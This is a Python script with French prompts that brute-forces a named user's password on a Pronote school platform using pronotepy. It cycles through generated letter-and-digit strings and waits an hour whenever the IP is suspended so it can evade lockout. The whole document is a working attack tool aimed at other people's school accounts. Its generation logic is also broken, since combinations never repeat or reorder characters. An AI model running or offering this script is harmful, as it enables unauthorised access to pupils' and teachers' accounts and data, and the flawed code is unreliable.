import pronotepy
import itertools
import time

link = input("lien pronote :")
username = str(input("Nom d'utilisateur :"))

liste = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
password = ""

def bruteforce():
    for i in range(len(liste) + 1):
        for subset in itertools.combinations(liste, i):
            try:
                password = str(subset).replace(",", "").replace(")", "").replace(" ", "").replace("(", "").replace("'", "")
                client = pronotepy.Client(link,username=username,password=password)
                if client.logged_in:
                    print(f"Le mot de passe de {username} est : {password}")
                    return password
                if not client.logged_in:
                    print(f"Mauvais mot de passe : {password}")
            except pronotepy.exceptions.CryptoError:
                print(f"Mauvais mot de passe : {password}")
            except pronotepy.exceptions.PronoteAPIError:
                print("Votre adresse IP est provisoirement suspendue ! Attendez que le programme reprenne...")
                time.sleep(3600)
        


bruteforce()